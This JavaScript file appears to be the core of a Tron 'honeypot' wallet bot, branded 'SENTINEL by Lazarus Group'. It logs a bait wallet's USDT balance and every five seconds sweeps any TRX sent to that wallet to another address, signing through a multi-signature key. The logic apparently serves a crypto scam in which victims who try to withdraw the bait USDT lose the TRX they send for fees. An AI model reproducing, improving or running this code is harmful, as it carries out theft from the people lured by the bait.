
import { formatUSDT, log } from './utils.js';
import { tronWeb, wallet } from './services/tronWeb.js';
import { getAccountPermissions, isValidSetup, setup } from './setup.js';
import { getUSDTetherBalance } from './services/usdtContract.js';

const lastState = {
    balance: 0,
    transferAmount: 0,
    hasError: false,
};

export async function getBalance(address) {
    try {
        const balance = await tronWeb.trx.getBalance(address);

        if (balance !== lastState.balance) {
            log(`[${address}] ${(balance / 1e6).toFixed(6)} TRX`);
        }
        lastState.balance = balance;

        return balance;
    } catch (error) {
        return 0;
    }
}

async function sendTRX(fromAddress, toAddress, amount) {
    try {
        const transaction = await tronWeb.transactionBuilder.sendTrx(toAddress, amount, fromAddress);
        const signedTransaction = await tronWeb.trx.multiSign(transaction, wallet.toPrivateKey, 2);

        await tronWeb.trx.sendRawTransaction(signedTransaction);

        if (amount !== lastState.transferAmount) {
            log(`[${fromAddress} => ${toAddress}] ${(amount / 1e6).toFixed(6)} TRX`, 'green');
        }

        lastState.transferAmount = amount;
        lastState.hasError = false;
    } catch (error) {
        if (!lastState.hasError) {
            log(`[${fromAddress} => ${toAddress}] 0 TRX`, 'red');
        }

        lastState.hasError = true;
    }
}

async function checkBalanceAndTransfer() {
    const minimumTransferAmount = 0.7042 * 1e6;

    try {
        const currentBalance = await getBalance(wallet.fromAddress);

        if (currentBalance > minimumTransferAmount * 2) {
            await sendTRX(wallet.fromAddress, wallet.toAddress, currentBalance - minimumTransferAmount * 2);
        }
    } catch (error) {
        return;
    }
}

const account = await getAccountPermissions(wallet.fromAddress);

console.log(`
    ▗▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖▗▖   
   ▐▌   ▐▌   ▐▛▚▖▐▌  █    █  ▐▛▚▖▐▌▐▌   ▐▌   
    ▝▀▚▖▐▛▀▀▘▐▌ ▝▜▌  █    █  ▐▌ ▝▜▌▐▛▀▀▘▐▌   
   ▗▄▄▞▘▐▙▄▄▖▐▌  ▐▌  █  ▗▄█▄▖▐▌  ▐▌▐▙▄▄▖▐▙▄▄▖ 
                           by 𝕷𝖆𝖟𝖆𝖗𝖚𝖘 𝕲𝖗𝖔𝖚𝖕                                
                                             `);

if (isValidSetup(account)) {
    const honeypotBalance = await getUSDTetherBalance(wallet.fromAddress);

    log(`[${wallet.fromAddress}] ${formatUSDT(honeypotBalance) } USDT`, 'green');
    setInterval(checkBalanceAndTransfer, 5000);
} else {
    setup();
}
